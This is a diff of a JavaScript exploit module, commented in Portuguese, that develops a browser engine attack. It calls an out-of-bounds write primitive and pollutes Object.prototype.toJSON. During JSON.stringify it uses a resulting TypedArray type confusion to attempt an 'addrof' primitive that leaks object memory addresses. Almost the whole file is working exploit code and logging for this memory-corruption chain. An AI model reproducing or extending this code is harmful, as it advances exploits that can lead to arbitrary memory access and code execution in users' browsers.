@@ -1,87 +1,97 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v1_fixed)
-// (Ou renomeie para testTypedArrayVictimAddrof.mjs)
+// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v2_RelaxedThis)
+// (Ou renomeie para testTypedArrayVictimAddrof_RelaxedThis.mjs)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    oob_array_buffer_real, // Usado para verificar se o OOB init funcionou
+    oob_array_buffer_real,
     oob_write_absolute,
     clearOOBEnvironment
-    // HEISENBUG_CRITICAL_WRITE_OFFSET e HEISENBUG_CRITICAL_WRITE_VALUE removidos da importação
 } from '../core_exploit.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V1_FIXED = "OriginalHeisenbug_TypedArrayAddrof_v1_Fixed";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS = "OriginalHeisenbug_TypedArrayAddrof_v2_RelaxedThis";
 
-const VICTIM_BUFFER_SIZE = 256; // Tamanho do ArrayBuffer subjacente
-
-// Definindo as constantes localmente, já que não são exportadas por core_exploit.mjs
+const VICTIM_BUFFER_SIZE = 256;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
 const LOCAL_HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
 
-
-let toJSON_call_details_TA = null; // TA para TypedArray
+let toJSON_call_details_TA_RT = null; // RT for RelaxedThis
 let object_to_leak_A = null;
 let object_to_leak_B = null;
-let victim_typed_array_ref = null; // Referência para o TypedArray vítima
+let victim_typed_array_ref = null;
 
-// Sonda para TypedArray com tentativa de Addrof
-function toJSON_TA_Probe_Addrof() {
-    toJSON_call_details_TA = {
-        probe_variant: "TA_Probe_Addrof_v1_Fixed",
+// Sonda para TypedArray com tentativa de Addrof e condição 'this' relaxada para escrita
+function toJSON_TA_Probe_Addrof_RelaxedThis() {
+    // Inicializa/reseta os detalhes para ESTA chamada da sonda.
+    // A variável global toJSON_call_details_TA_RT será atualizada,
+    // e a última atualização é o que será usado externamente.
+    toJSON_call_details_TA_RT = {
+        probe_variant: "TA_Probe_Addrof_v2_RelaxedThis",
         this_type_in_toJSON: "N/A_before_call",
         error_in_toJSON: null,
-        probe_called: false
+        probe_called: false,
+        this_was_victim_ref_at_confusion: null
     };
 
     try {
-        toJSON_call_details_TA.probe_called = true;
-        toJSON_call_details_TA.this_type_in_toJSON = Object.prototype.toString.call(this);
-        logS3(`[${toJSON_call_details_TA.probe_variant}] 'this' é o objeto vítima. Tipo de 'this': ${toJSON_call_details_TA.this_type_in_toJSON}`, "leak");
+        toJSON_call_details_TA_RT.probe_called = true;
+        toJSON_call_details_TA_RT.this_type_in_toJSON = Object.prototype.toString.call(this);
+        
+        logS3(`[${toJSON_call_details_TA_RT.probe_variant}] Sonda invocada. Tipo de 'this': ${toJSON_call_details_TA_RT.this_type_in_toJSON}. 'this' === victim_typed_array_ref? ${this === victim_typed_array_ref}`, "leak");
 
-        if (this === victim_typed_array_ref && toJSON_call_details_TA.this_type_in_toJSON === '[object Object]') {
-            logS3(`[${toJSON_call_details_TA.probe_variant}] TYPE CONFUSION NO TYPEDARRAY CONFIRMADA! Tentando escritas para addrof...`, "vuln");
+        if (toJSON_call_details_TA_RT.this_type_in_toJSON === '[object Object]') {
+            // A confusão de tipo ocorreu para 'this' NESTA invocação específica da sonda.
+            logS3(`[${toJSON_call_details_TA_RT.probe_variant}] TYPE CONFUSION DETECTADA para 'this' (agora [object Object])!`, "vuln");
+            
+            const is_this_victim = (this === victim_typed_array_ref);
+            toJSON_call_details_TA_RT.this_was_victim_ref_at_confusion = is_this_victim;
+            logS3(`[${toJSON_call_details_TA_RT.probe_variant}] No momento da confusão, 'this' === victim_typed_array_ref? ${is_this_victim}`, "info");
 
+            logS3(`[${toJSON_call_details_TA_RT.probe_variant}] Tentando escritas addrof no 'this' ([object Object])...`, "warn");
             if (object_to_leak_A) {
                 this[0] = object_to_leak_A;
-                logS3(`[${toJSON_call_details_TA.probe_variant}] Escrita de object_to_leak_A em this[0] (supostamente) realizada.`, "info");
+                logS3(`[${toJSON_call_details_TA_RT.probe_variant}] Escrita de object_to_leak_A em this[0] (supostamente) realizada.`, "info");
             }
             if (object_to_leak_B) {
                 this[1] = object_to_leak_B;
-                logS3(`[${toJSON_call_details_TA.probe_variant}] Escrita de object_to_leak_B em this[1] (supostamente) realizada.`, "info");
+                logS3(`[${toJSON_call_details_TA_RT.probe_variant}] Escrita de object_to_leak_B em this[1] (supostamente) realizada.`, "info");
             }
-
         } else if (this === victim_typed_array_ref) {
-            logS3(`[${toJSON_call_details_TA.probe_variant}] Type confusion NÃO confirmada para TypedArray. Tipo de 'this': ${toJSON_call_details_TA.this_type_in_toJSON}`, "warn");
+            // 'this' é nossa vítima, mas ainda não foi confundido NESTA invocação.
+            logS3(`[${toJSON_call_details_TA_RT.probe_variant}] 'this' é victim_typed_array_ref, mas o tipo é ${toJSON_call_details_TA_RT.this_type_in_toJSON}. Sem confusão ainda para este 'this'.`, "info");
         } else {
-            logS3(`[${toJSON_call_details_TA.probe_variant}] 'this' NÃO é victim_typed_array_ref. Tipo: ${toJSON_call_details_TA.this_type_in_toJSON}. This: ${this}`, "warn");
+            // 'this' não é nossa vítima E não está confundido (ou está confundido mas não é nossa vítima).
+            logS3(`[${toJSON_call_details_TA_RT.probe_variant}] 'this' (tipo: ${toJSON_call_details_TA_RT.this_type_in_toJSON}) não é victim_typed_array_ref. Sem ação.`, "warn");
         }
 
     } catch (e) {
-        toJSON_call_details_TA.error_in_toJSON = `${e.name}: ${e.message}`;
-        logS3(`[${toJSON_call_details_TA.probe_variant}] ERRO na sonda: ${e.name} - ${e.message}`, "error");
+        toJSON_call_details_TA_RT.error_in_toJSON = `${e.name}: ${e.message}`;
+        logS3(`[${toJSON_call_details_TA_RT.probe_variant}] ERRO na sonda: ${e.name} - ${e.message}`, "error");
     }
-    return { minimal_TA_probe_executed: true };
+    return { minimal_TA_probe_executed_RT: true };
 }
 
 
-export async function executeTypedArrayVictimAddrofTest_Fixed() { // Nome da função exportada atualizado
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V1_FIXED}.triggerAndAddrof`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray) e Tentativa de Addrof ---`, "test", FNAME_CURRENT_TEST);
-    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V1_FIXED} Inic...`;
+export async function executeTypedArrayVictimAddrofTest_RelaxedThis() {
+    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS}.triggerAndAddrof`;
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug (TypedArray, This Relaxado) e Tentativa de Addrof ---`, "test", FNAME_CURRENT_TEST);
+    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS} Inic...`;
 
-    toJSON_call_details_TA = null;
+    // Reset das variáveis globais do módulo
+    toJSON_call_details_TA_RT = null;
     victim_typed_array_ref = null;
-    object_to_leak_A = { marker: "ObjA_TA_v1f", id: Date.now() }; // v1f for fixed
-    object_to_leak_B = { marker: "ObjB_TA_v1f", id: Date.now() + 345 };
+    object_to_leak_A = { marker: "ObjA_TA_v2rt", id: Date.now() }; // v2rt for RelaxedThis
+    object_to_leak_B = { marker: "ObjB_TA_v2rt", id: Date.now() + 456 };
 
     let errorCapturedMain = null;
     let stringifyOutput = null;
+    let final_toJSON_details_capture = null; // Para capturar os detalhes da sonda antes do finally
     
     let addrof_result_A = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof A @ view[0]: Não tentado ou Heisenbug/escrita falhou." };
     let addrof_result_B = { success: false, leaked_address_as_double: null, leaked_address_as_int64: null, message: "Addrof B @ view[1]: Não tentado ou Heisenbug/escrita falhou." };
     
-    const fillPattern = 0.987654321098765;
+    const fillPattern = 0.11223344556677; // Novo padrão
 
     try {
         await triggerOOB_primitive({ force_reinit: true });
@@ -106,7 +116,7 @@ export async function executeTypedArrayVictimAddrofTest_Fixed() { // Nome da fun
         }
 
         logS3(`PASSO 2: underlying_ab (tamanho ${VICTIM_BUFFER_SIZE} bytes) e victim_typed_array_ref (Uint8Array) criados. View preenchida com ${float64_view_on_underlying_ab[0]}.`, "test", FNAME_CURRENT_TEST);
-        logS3(`   Tentando JSON.stringify em victim_typed_array_ref com ${toJSON_TA_Probe_Addrof.name}...`, "test", FNAME_CURRENT_TEST);
+        logS3(`   Tentando JSON.stringify em victim_typed_array_ref com ${toJSON_TA_Probe_Addrof_RelaxedThis.name}...`, "test", FNAME_CURRENT_TEST);
         
         const ppKey = 'toJSON';
         let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
@@ -114,20 +124,28 @@ export async function executeTypedArrayVictimAddrofTest_Fixed() { // Nome da fun
 
         try {
             Object.defineProperty(Object.prototype, ppKey, {
-                value: toJSON_TA_Probe_Addrof,
+                value: toJSON_TA_Probe_Addrof_RelaxedThis,
                 writable: true, configurable: true, enumerable: false
             });
             pollutionApplied = true;
-            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_TA_Probe_Addrof.name}.`, "info", FNAME_CURRENT_TEST);
+            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_TA_Probe_Addrof_RelaxedThis.name}.`, "info", FNAME_CURRENT_TEST);
 
             logS3(`  Chamando JSON.stringify(victim_typed_array_ref)...`, "warn", FNAME_CURRENT_TEST);
             stringifyOutput = JSON.stringify(victim_typed_array_ref); 
             
-            logS3(`  JSON.stringify(victim_typed_array_ref) completou. Resultado (da sonda): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
-            logS3(`  Detalhes da sonda (toJSON_call_details_TA): ${toJSON_call_details_TA ? JSON.stringify(toJSON_call_details_TA) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
+            // Captura os detalhes da sonda (que refletem a última chamada)
+            if (toJSON_call_details_TA_RT) {
+                final_toJSON_details_capture = JSON.parse(JSON.stringify(toJSON_call_details_TA_RT)); // Cópia profunda
+            }
 
-            if (toJSON_call_details_TA && toJSON_call_details_TA.probe_called && toJSON_call_details_TA.this_type_in_toJSON === "[object Object]") {
-                logS3(`  HEISENBUG NO TYPEDARRAY CONFIRMADA (via toJSON_call_details_TA)! Tipo de 'this': ${toJSON_call_details_TA.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
+            logS3(`  JSON.stringify(victim_typed_array_ref) completou. Resultado (da sonda stringify): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
+            logS3(`  Detalhes da sonda capturados (toJSON_call_details_TA_RT): ${final_toJSON_details_capture ? JSON.stringify(final_toJSON_details_capture) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
+
+            if (final_toJSON_details_capture && final_toJSON_details_capture.probe_called && final_toJSON_details_capture.this_type_in_toJSON === "[object Object]") {
+                logS3(`  HEISENBUG NO TYPEDARRAY CONFIRMADA (via detalhes capturados)! Tipo de 'this' na última sonda: ${final_toJSON_details_capture.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
+                if (final_toJSON_details_capture.this_was_victim_ref_at_confusion !== null) {
+                    logS3(`    Na última sonda confusa, 'this' === victim_typed_array_ref? ${final_toJSON_details_capture.this_was_victim_ref_at_confusion}`, "info")
+                }
                 
                 logS3("PASSO 3: Verificando float64_view_on_underlying_ab APÓS Heisenbug e tentativas de escrita na sonda...", "warn", FNAME_CURRENT_TEST);
 
@@ -141,9 +159,9 @@ export async function executeTypedArrayVictimAddrofTest_Fixed() { // Nome da fun
                     (addrof_result_A.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_A.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                     logS3("  !!!! VALOR LIDO em view[0] PARECE UM PONTEIRO POTENCIAL (ObjA) !!!!", "vuln", FNAME_CURRENT_TEST);
                     addrof_result_A.success = true;
-                    addrof_result_A.message = "Heisenbug (TypedArray) confirmada E leitura de view[0] sugere um ponteiro para ObjA.";
+                    addrof_result_A.message = "Heisenbug (TypedArray, RelaxedThis) confirmada E leitura de view[0] sugere um ponteiro para ObjA.";
                 } else {
-                    addrof_result_A.message = "Heisenbug (TypedArray) confirmada, mas valor lido de view[0] não parece ponteiro para ObjA ou buffer não foi alterado.";
+                    addrof_result_A.message = "Heisenbug (TypedArray, RelaxedThis) confirmada, mas valor lido de view[0] não parece ponteiro para ObjA ou buffer não foi alterado.";
                     if (val_A_double === (fillPattern + 0)) addrof_result_A.message += " (Valor é igual ao fillPattern inicial)";
                 }
 
@@ -157,31 +175,31 @@ export async function executeTypedArrayVictimAddrofTest_Fixed() { // Nome da fun
                     (addrof_result_B.leaked_address_as_int64.high() < 0x00020000 || (addrof_result_B.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                     logS3("  !!!! VALOR LIDO em view[1] PARECE UM PONTEIRO POTENCIAL (ObjB) !!!!", "vuln", FNAME_CURRENT_TEST);
                     addrof_result_B.success = true;
-                    addrof_result_B.message = "Heisenbug (TypedArray) confirmada E leitura de view[1] sugere um ponteiro para ObjB.";
+                    addrof_result_B.message = "Heisenbug (TypedArray, RelaxedThis) confirmada E leitura de view[1] sugere um ponteiro para ObjB.";
                 } else {
-                    addrof_result_B.message = "Heisenbug (TypedArray) confirmada, mas valor lido de view[1] não parece ponteiro para ObjB ou buffer não foi alterado.";
+                    addrof_result_B.message = "Heisenbug (TypedArray, RelaxedThis) confirmada, mas valor lido de view[1] não parece ponteiro para ObjB ou buffer não foi alterado.";
                     if (val_B_double === (fillPattern + 1)) addrof_result_B.message += " (Valor é igual ao fillPattern inicial)";
                 }
 
                 if (addrof_result_A.success || addrof_result_B.success) {
-                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V1_FIXED}: Addr? SUCESSO!`;
+                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS}: Addr? SUCESSO!`;
                 } else {
-                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V1_FIXED}: Heisenbug OK, Addr Falhou`;
+                    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS}: Heisenbug OK, Addr Falhou`;
                 }
 
             } else {
-                let msg = "Heisenbug (TypedArray como [object Object]) não foi confirmada via toJSON_call_details_TA.";
-                if(toJSON_call_details_TA && toJSON_call_details_TA.this_type_in_toJSON) msg += ` Tipo obs: ${toJSON_call_details_TA.this_type_in_toJSON}`;
-                else if (!toJSON_call_details_TA) msg += " toJSON_call_details_TA é null.";
+                let msg = "Heisenbug (TypedArray como [object Object]) não foi confirmada via detalhes capturados da sonda.";
+                if(final_toJSON_details_capture && final_toJSON_details_capture.this_type_in_toJSON) msg += ` Tipo obs na última sonda: ${final_toJSON_details_capture.this_type_in_toJSON}`;
+                else if (!final_toJSON_details_capture) msg += " Detalhes da sonda (final_toJSON_details_capture) são null.";
                 addrof_result_A.message = msg; addrof_result_B.message = msg;
                 logS3(`  ALERTA: ${msg}`, "error", FNAME_CURRENT_TEST);
-                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V1_FIXED}: Heisenbug Falhou`;
+                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS}: Heisenbug Falhou`;
             }
 
         } catch (e_str) {
             errorCapturedMain = e_str;
             logS3(`    ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}${e_str.stack ? '\n'+e_str.stack : ''}`, "critical", FNAME_CURRENT_TEST);
-            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V1_FIXED}: Stringify/Addrof ERR`;
+            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS}: Stringify/Addrof ERR`;
             addrof_result_A.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
             addrof_result_B.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
         } finally {
@@ -196,7 +214,7 @@ export async function executeTypedArrayVictimAddrofTest_Fixed() { // Nome da fun
         errorCapturedMain = e_outer_main;
         logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
         if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
-        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V1_FIXED} FALHOU CRITICAMENTE`;
+        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V2_RELAXEDTHIS} FALHOU CRITICAMENTE`;
         addrof_result_A.message = `Erro geral no teste: ${e_outer_main.name}`;
         addrof_result_B.message = `Erro geral no teste: ${e_outer_main.name}`;
     } finally {
@@ -211,16 +229,17 @@ export async function executeTypedArrayVictimAddrofTest_Fixed() { // Nome da fun
             logS3(`  Addrof B (Int64): ${addrof_result_B.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
         }
         
+        // Limpeza das referências globais do módulo
         object_to_leak_A = null;
         object_to_leak_B = null;
         victim_typed_array_ref = null;
-        toJSON_call_details_TA = null; 
+        toJSON_call_details_TA_RT = null; 
     }
     return { 
         errorOccurred: errorCapturedMain, 
         potentiallyCrashed: false,
         stringifyResult: stringifyOutput, 
-        toJSON_details: toJSON_call_details_TA,
+        toJSON_details: final_toJSON_details_capture, // Retorna os detalhes capturados
         addrof_A_attempt_result: addrof_result_A,
         addrof_B_attempt_result: addrof_result_B
     };
